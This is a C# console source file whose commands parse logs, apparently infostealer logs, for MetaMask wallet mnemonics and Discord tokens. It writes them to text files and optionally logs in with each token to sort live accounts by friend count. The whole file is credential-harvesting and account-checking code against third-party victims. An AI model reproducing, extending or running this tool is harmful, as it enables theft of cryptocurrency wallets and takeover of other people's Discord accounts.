using Console.Models;
using Console.Models.Abstractions;
using Console.Models.Attributes;
using Console.Models.Views;
using Core.Discord;
using Core.Wallets;

namespace Console.Views;

public class MainView : ArgsView
{
    private readonly Configuration _config;
    
    public MainView(IRoot root, Configuration config) : base(root)
    {
        _config = config;
    }
    
    [Command]
    public Task Wallets()
    {
        Directory.CreateDirectory("Wallets");
        
        using var mnemonics = new StreamWriter("Wallets/mnemonics.txt", new FileStreamOptions
        {
            Access = FileAccess.Write,
            Mode = FileMode.OpenOrCreate,
        });
        
        foreach (var wallet in new MetamaskParser().ByLogs(_config.Path).DistinctBy(x => x?.Mnemonic))
        {
            if (wallet?.Mnemonic is null) continue;
            
            System.Console.WriteLine(wallet.Mnemonic);
            mnemonics.WriteLine(wallet.Mnemonic);
        }
        
        System.Console.WriteLine("Press any key for continue");
        System.Console.ReadKey(true);

        return Task.CompletedTask;
    }

    [Command]
    public Task Discord()
    {
        Directory.CreateDirectory("Discord");
        
        StreamWriter? all, invalid = null, valid = null;

        var options = new FileStreamOptions
        {
            Access = FileAccess.Write,
            Mode = FileMode.OpenOrCreate,
        };
        var checker = new DiscordChecker();
        
        System.Console.WriteLine("Check tokens? [Y/N]"); // todo add check proxies

        var check = System.Console.ReadKey(true).Key == ConsoleKey.Y;

        all = new StreamWriter("Discord/tokens.txt", options);
        
        if (check)
        {
            invalid = new StreamWriter("Discord/invalid.txt", options);
            valid = new StreamWriter("Discord/valid.txt", options);
        }

        foreach (var token in new DiscordParser().ByLogs(_config.Path).Distinct())
        {
            all.WriteLine(token);

            if (!check) continue;

            if (checker.TryLogin(token) is {} account)
            {
                System.Console.WriteLine($"Token: {token}\nFriends: {checker.Friends(account)?.Count() ?? 0}");
                valid!.WriteLine(token);
            }
            else
                invalid!.WriteLine(token);
        }

        all.Dispose();
        invalid?.Dispose();
        valid?.Dispose();
        
        System.Console.WriteLine("Press any key for continue");
        System.Console.ReadKey(true);
        
        return Task.CompletedTask;
    }
}